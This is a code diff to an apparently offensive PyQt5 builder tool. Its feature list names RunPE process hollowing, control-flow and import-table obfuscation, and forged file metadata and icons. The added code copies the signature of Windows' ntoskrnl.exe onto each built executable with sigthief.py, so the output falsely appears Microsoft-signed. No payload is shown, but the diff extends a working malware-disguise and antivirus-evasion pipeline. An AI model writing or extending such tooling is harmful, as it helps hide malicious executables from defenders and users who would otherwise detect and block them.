@@ -14,7 +14,7 @@ TODO :
     - Good Section sizes
     - Add resources
     - Random Windows API calls (help)
-    - Code signing (optional)
+    - Code signing
 
 Done :
     - RunPE
@@ -22,6 +22,7 @@ Done :
     - Control flow
     - IAT obfuscation (adding "normal" imports in addition to the others)
     - Change PE metadata (company, description, etc...)
+    - File icon
 """
 
 from PyQt5 import QtCore, QtGui, QtWidgets
@@ -196,7 +197,7 @@ class Ui_mainWindow(object):
         
         if return_code :
             self.label_2.setText("build failed.")
-            QCoreApplication.processEvents()   
+            QCoreApplication.processEvents()
 
         # Cleaning up..
         os.remove("main.cpp")
@@ -205,6 +206,21 @@ class Ui_mainWindow(object):
         if not return_code :
             self.label_2.setText(f"--> {out_filename}")
             QCoreApplication.processEvents()
+        else :
+            return
+        
+        self.label_2.setText("Signing the file...")
+        QCoreApplication.processEvents()
+        
+        windir = os.getenv("WINDIR")
+        cmd = f'python sigthief.py -i "{windir}\\System32\\ntoskrnl.exe" -t {out_filename} -o {out_filename.replace(".exe","")+"_signed"}.exe'
+        os.system(cmd)
+        
+        os.remove(out_filename)
+        os.rename(out_filename.replace(".exe","")+"_signed.exe", out_filename)
+        
+        self.label_2.setText("done.")
+        QCoreApplication.processEvents()
         
     def fileDialog(self):
         options = QtWidgets.QFileDialog.Options()
